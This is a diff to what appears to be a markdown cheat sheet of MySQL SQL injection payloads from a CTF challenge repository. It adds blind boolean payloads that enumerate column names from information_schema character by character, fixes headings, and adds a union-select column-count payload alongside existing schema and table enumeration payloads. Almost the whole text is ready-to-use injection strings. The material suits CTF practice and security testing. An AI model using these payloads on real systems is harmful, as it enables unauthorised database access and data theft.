@@ -5,7 +5,7 @@
   - `-- `
   - `/*comment*/`
 
-### Blind sqli
+### Blind SQLi
   - Finding correct payload
       - `admin' and (1=0)#` *return false*
       - `admin' and (1=1)#` *return true*
@@ -19,14 +19,18 @@
       - `admin' and (SELECT LENGTH((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA ORDER BY SCHEMA_NAME LIMIT 1 OFFSET {index}))={name_length})#`
       - `admin' and (SELECT ASCII(SUBSTRING((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA ORDER BY SCHEMA_NAME LIMIT 1 OFFSET {schema_index}),{name_index},1))={ord(guess)})#`
   
-  - Get tables from schema  [code.py](https://github.com/ByamB4/Common-CTF-Challenges/blob/main/web/sqli/src/mysql_blind_get_tables.py)
+  - Get tables from schema [code.py](https://github.com/ByamB4/Common-CTF-Challenges/blob/main/web/sqli/src/mysql_blind_get_tables.py)
       - `admin' and (SELECT COUNT(*)={guess} total_schemas FROM information_schema.TABLES WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}')#`
       - `admin' and (SELECT LENGTH((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' ORDER BY TABLE_NAME LIMIT 1 OFFSET {index}))={name_length})#`
       - `admin' and (SELECT ASCII(SUBSTRING((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' ORDER BY TABLE_NAME LIMIT 1 OFFSET {table_index}),{name_index},1))={ord(guess)})#`
+   
+  - Get columns from table [code.py](https://github.com/ByamB4/Common-CTF-Challenges/blob/main/web/sqli/src/mysql_blind_get_columns.py)
+      - `admin' and (SELECT COUNT(*)={guess} total_columns FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' AND TABLE_NAME='{self.TABLE_NAME}')#`
+      - `admin' and (SELECT LENGTH((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' AND TABLE_NAME='{self.TABLE_NAME}' ORDER BY COLUMN_NAME LIMIT 1 OFFSET {index}))={name_length})#`
+      - `admin' and (SELECT ASCII(SUBSTRING((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' AND TABLE_NAME='{self.TABLE_NAME}' ORDER BY COLUMN_NAME LIMIT 1 OFFSET {column_index}),{name_index},1))={ord(guess)})#`
+   
 
-
-
-###
+### Union SQLi
 - Extract number column
 
   - `'union select 1,2,3#`
